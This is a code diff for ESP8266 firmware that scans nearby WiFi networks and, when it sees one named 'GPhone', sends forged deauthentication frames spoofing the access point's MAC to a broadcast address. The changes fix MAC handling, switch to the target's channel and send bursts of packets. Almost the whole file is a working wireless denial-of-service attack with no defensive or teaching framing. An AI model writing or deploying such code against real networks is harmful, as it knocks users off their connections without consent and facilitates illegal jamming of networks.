@@ -1,9 +1,5 @@
 #include <ESP8266WiFi.h>
 
-extern "C" {
-#include "user_interface.h"
-}
-
 #define NUMNET 30
 
 uint8_t numNetworks = 0;
@@ -25,33 +21,30 @@ void loop() {
   delay(5000);
 }
 
-void deauthAttack(char* ap) {
-    Serial.println("Deauthing...");
+void deauthAttack(uint8_t* apMac, uint8_t channel) {
+  Serial.println("Deauthing...");
   uint8_t packet[26] = {
     0xC0, 0x00, // Frame Control
     0x3A, 0x01, // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
-    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // Source (AP MAC)
-    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, // BSSID (AP MAC)
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast) (all 0xFF means to everyone instead of a specific device)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (AP MAC)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP MAC)
     0x00, 0x00, // Fragment & Sequence number
-    0x07, 0x00  // Reason code 7 (Class 3 frame received from nonassociated STA)
+    0x01, 0x00  // Reason code 1 (no reason given)
   };
 
-  // Change source and BSSID to the AP's MAC address
-  for (int i = 0; i < 6; i++) {
-    packet[10 + i] = strtol(&ap[i * 3], NULL, 16);
-    packet[16 + i] = strtol(&ap[i * 3], NULL, 16);
-    Serial.printf("%c ", &ap+ i * 3);
-  }
+  wifi_set_channel(channel);//same chanel as
 
+  memcpy(&packet[10], apMac, 6);
+  memcpy(&packet[16], apMac, 6);
 
-  // Send the packet in a loop
-  while (true) {
-    wifi_send_pkt_freedom(packet, 26, 0);
-    delay(1);
-  }
+  wifi_send_pkt_freedom(packet, 26, 0);
+  wifi_send_pkt_freedom(packet, 26, 0);
+  wifi_send_pkt_freedom(packet, 26, 0);
+  wifi_send_pkt_freedom(packet, 26, 0);
+  wifi_send_pkt_freedom(packet, 26, 0);
+  wifi_send_pkt_freedom(packet, 26, 0);
 }
-
 void findNewNetworks(){
   uint8_t newNumNetworks = WiFi.scanNetworks();
 
@@ -69,7 +62,11 @@ void findNewNetworks(){
     if(newNetwork){
       String ssid = WiFi.SSID(i);
       if(ssid == "GPhone"){
-        deauthAttack(&(WiFi.BSSIDstr(i))[0]);
+        Serial.println("Network found");
+        Serial.printf("Mac Address: %s\n", WiFi.BSSIDstr(i));
+        Serial.printf("Wifi Channel: %d\n", WiFi.channel(i));
+
+        deauthAttack(WiFi.BSSID(i), WiFi.channel(i));
       }
     }
   }
